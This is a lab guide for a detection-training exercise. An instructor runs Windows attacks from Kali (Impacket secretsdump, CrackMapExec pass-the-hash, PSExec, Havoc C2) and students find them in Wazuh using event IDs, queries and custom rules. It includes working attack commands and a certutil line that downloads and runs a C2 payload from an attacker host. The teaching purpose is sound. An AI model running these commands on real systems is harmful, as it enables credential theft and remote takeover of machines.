# Part 2 — Windows Attacks & Wazuh Detection Rules

## Setup (do this before attacks)

### Step 1 — Deploy Wazuh Server (Docker, ~5 min)

Run this on a Linux VM (not the Windows machines):
```bash
curl -sO https://packages.wazuh.com/4.7/wazuh-install.sh
sudo bash wazuh-install.sh -a
```
Or with Docker:
```bash
git clone https://github.com/wazuh/wazuh-docker.git -b v4.7.3
cd wazuh-docker/single-node
docker compose up -d
```

Wazuh dashboard → `https://<WAZUH_IP>` (admin / SecretPassword)

---

### Step 2 — Install Agent on Windows VMs

Run this in PowerShell **as Administrator** on each Windows machine:

```powershell
# Replace WAZUH_MANAGER_IP with the actual IP
Invoke-WebRequest -Uri https://packages.wazuh.com/4.x/windows/wazuh-agent-4.7.3-1.msi -OutFile wazuh-agent.msi
msiexec.exe /i wazuh-agent.msi /q WAZUH_MANAGER="<WAZUH_MANAGER_IP>" WAZUH_AGENT_NAME="Win-VM1"
Start-Service WazuhSvc
```

Repeat on the second VM with `WAZUH_AGENT_NAME="Win-VM2"`.

Confirm in Wazuh dashboard → **Agents** — both VMs should appear as Active.

---

### Step 3 — Enable Windows Audit Policies (critical for seeing attacks)

Run in PowerShell **as Administrator** on both Windows VMs:
```powershell
# Process creation logging (needed to see impacket/havoc processes)
auditpol /set /subcategory:"Process Creation" /success:enable /failure:enable

# Logon events
auditpol /set /subcategory:"Logon" /success:enable /failure:enable

# Account logon
auditpol /set /subcategory:"Credential Validation" /success:enable /failure:enable

# Service creation (PSExec installs a service)
auditpol /set /subcategory:"Security System Extension" /success:enable /failure:enable

# Object Access (scheduled tasks)
auditpol /set /subcategory:"Other Object Access Events" /success:enable /failure:enable

# Enable PowerShell script block logging
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 1 -Force
```

> Without these, most attacks will generate no logs. Do this first.

---

## Key Windows Event IDs

These are the Event IDs students will see in Wazuh. Know these cold.

| Event ID | Meaning | Triggered By |
|---|---|---|
| **4624** | Successful logon | Every login — check Logon Type |
| **4625** | Failed logon | Wrong password, brute force |
| **4648** | Logon with explicit credentials | RunAs, PSExec, CME |
| **4672** | Special privileges assigned | Admin logged in |
| **4688** | New process created | Any new process (needs audit policy) |
| **4697** | Service installed | PSExec, Havoc service persistence |
| **7045** | New service installed (System log) | PSExec, malware services |
| **4776** | NTLM credential validation | Pass-the-Hash, NTLM auth |
| **4698** | Scheduled task created | Persistence via schtasks |
| **4103/4104** | PowerShell module/script logging | Malicious PowerShell |

### Logon Types (for Event 4624)

| Type | Meaning |
|---|---|
| 2 | Interactive (local keyboard) |
| 3 | Network (SMB, file share) |
| 10 | Remote Interactive (RDP) |

> Pass-the-Hash shows up as **Type 3 + NTLM** with no password, from a remote IP.

---

## Attack 1 — Credential Dumping (Impacket secretsdump)

**Mentor runs from Kali:**
```bash
# Dump hashes from remote Windows machine (needs admin creds)
impacket-secretsdump Administrator:'Password123'@<WIN_VM1_IP>

# Output will show:
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:NTLM_HASH:::
# Copy the NT hash (part after the third colon)
```

**What students see in Wazuh:**
- Event 4624 Logon Type 3 (network logon)
- Event 4776 (NTLM credential validation)
- Multiple registry/SAM access events

**Find it in Wazuh → Discover:**
```
data.win.system.eventID: 4776 AND data.win.eventdata.workstationName: *kali*
```

---

## Attack 2 — Pass the Hash (CrackMapExec)

**Mentor runs from Kali:**
```bash
# Use the NT hash grabbed from secretsdump
crackmapexec smb <WIN_VM2_IP> -u Administrator -H <NT_HASH>

# If successful, output shows: [+] ... (Pwn3d!)
# Run a command via PTH
crackmapexec smb <WIN_VM2_IP> -u Administrator -H <NT_HASH> -x "whoami"
crackmapexec smb <WIN_VM2_IP> -u Administrator -H <NT_HASH> -x "net user"
```

**What students see in Wazuh:**
- Event **4624** — Logon Type 3, AuthPackage: NTLM (no password was used)
- Event **4648** — logon with explicit credentials
- Event **4672** — admin rights assigned

**Signature of PTH in logs:**
```
LogonType = 3
AuthenticationPackageName = NTLM
WorkstationName = KALI (attacker machine)
IpAddress = <KALI_IP>
```

**Find it in Wazuh → Discover:**
```
data.win.system.eventID: 4624 AND data.win.eventdata.logonType: 3 AND data.win.eventdata.authenticationPackageName: NTLM
```

---

## Attack 3 — Remote Execution (Impacket PSExec)

**Mentor runs from Kali:**
```bash
# With password
impacket-psexec Administrator:'Password123'@<WIN_VM1_IP>

# With hash (PTH)
impacket-psexec -hashes :NT_HASH Administrator@<WIN_VM1_IP>

# Once shell opens, run:
whoami
ipconfig
net localgroup administrators
```

**What students see in Wazuh:**
- Event **7045** — new service `PSEXESVC` installed
- Event **4697** — service creation
- Event **4624** — Type 3 logon
- Event **4688** — cmd.exe spawned by the service

**Find it in Wazuh → Discover:**
```
data.win.eventdata.serviceName: PSEXESVC
```
or
```
data.win.system.eventID: 7045
```

---

## Attack 4 — Havoc C2 (Command & Control)

**Mentor setup on Kali:**
```bash
# Start Havoc team server
cd /opt/havoc
sudo ./havoc server --profile ./profiles/havoc.yaotl -v

# In a second terminal, open Havoc client
./havoc client
```

**In Havoc client (GUI):**
1. **View → Listeners → Add** — HTTP listener on port 80 or 443, set Host to `<KALI_IP>`
2. **Attack → Payload → Generate** — select the listener, output: Windows EXE
3. Save the generated `demon.exe` (or similar) to `/tmp/`

**Deliver agent to Windows VM (mentor simulates delivery):**
```bash
# Host it with Python
python3 -m http.server 8080 --directory /tmp/

# On Windows VM — student opens cmd.exe as Admin and runs:
certutil -urlcache -split -f http://<KALI_IP>:8080/demon.exe C:\Windows\Temp\demon.exe
C:\Windows\Temp\demon.exe
```

**What students see in Wazuh:**
- Event **4688** — `certutil.exe` with URL in command line (LOLBin download)
- Event **4688** — `demon.exe` new process spawned from `cmd.exe`
- Event **4697/7045** — if Havoc installs persistence as a service
- Outbound connection to C2 IP (if Suricata/Sysmon is installed)

**Find it in Wazuh → Discover:**
```
data.win.eventdata.commandLine: *certutil* AND data.win.eventdata.commandLine: *urlcache*
```
```
data.win.eventdata.parentImage: *cmd.exe* AND data.win.eventdata.image: *.exe
```

---

## Wazuh Detection Rules

Add these rules to the Wazuh manager at:
```
/var/ossec/etc/rules/local_rules.xml
```
Then restart: `sudo systemctl restart wazuh-manager`

```xml
<group name="windows,attack,">

  <!-- Pass-the-Hash: NTLM network logon from non-domain machine -->
  <rule id="100001" level="12">
    <if_group>windows</if_group>
    <field name="win.system.eventID">^4624$</field>
    <field name="win.eventdata.logonType">^3$</field>
    <field name="win.eventdata.authenticationPackageName">NTLM</field>
    <description>Possible Pass-the-Hash: NTLM network logon detected</description>
    <mitre>
      <id>T1550.002</id>
    </mitre>
    <group>pth,lateral_movement,</group>
  </rule>

  <!-- Brute Force: multiple failed logons from same source -->
  <rule id="100002" level="10" frequency="5" timeframe="30">
    <if_group>windows</if_group>
    <field name="win.system.eventID">^4625$</field>
    <same_field>win.eventdata.ipAddress</same_field>
    <description>Brute force attack: 5+ failed logons in 30 seconds from same IP</description>
    <mitre>
      <id>T1110</id>
    </mitre>
    <group>brute_force,</group>
  </rule>

  <!-- PSExec: PSEXESVC service installed -->
  <rule id="100003" level="14">
    <if_group>windows</if_group>
    <field name="win.system.eventID">^7045$</field>
    <field name="win.eventdata.serviceName">PSEXESVC</field>
    <description>PSExec service installed - lateral movement via SMB</description>
    <mitre>
      <id>T1569.002</id>
    </mitre>
    <group>lateral_movement,psexec,</group>
  </rule>

  <!-- Certutil LOLBin download (Havoc/malware delivery) -->
  <rule id="100004" level="12">
    <if_group>windows</if_group>
    <field name="win.system.eventID">^4688$</field>
    <field name="win.eventdata.newProcessName">certutil.exe</field>
    <field name="win.eventdata.commandLine">urlcache</field>
    <description>Certutil used to download file - possible C2 payload delivery</description>
    <mitre>
      <id>T1105</id>
    </mitre>
    <group>c2,lolbin,</group>
  </rule>

  <!-- Credential Dumping: secretsdump triggers NTLM validation spike -->
  <rule id="100005" level="12" frequency="10" timeframe="10">
    <if_group>windows</if_group>
    <field name="win.system.eventID">^4776$</field>
    <same_field>win.eventdata.workstationName</same_field>
    <description>Multiple NTLM credential validations - possible credential dumping</description>
    <mitre>
      <id>T1003.002</id>
    </mitre>
    <group>credential_access,</group>
  </rule>

</group>
```

---

## Exercise Checklist

For each attack, students should:
- [ ] Find the log in Wazuh Discover
- [ ] Identify the Event ID and key fields
- [ ] Write a rule that would alert on it
- [ ] Trigger the attack again and confirm the alert fires

---

## MITRE ATT&CK Reference

| Attack | Technique ID | Name |
|---|---|---|
| secretsdump | T1003.002 | OS Credential Dumping: SAM |
| Pass the Hash | T1550.002 | Use Alternate Auth: PTH |
| PSExec | T1569.002 | System Services: Service Execution |
| CrackMapExec | T1021.002 | Remote Services: SMB/Windows Admin Shares |
| Havoc C2 | T1071.001 | Application Layer Protocol: Web |
| certutil download | T1105 | Ingress Tool Transfer |
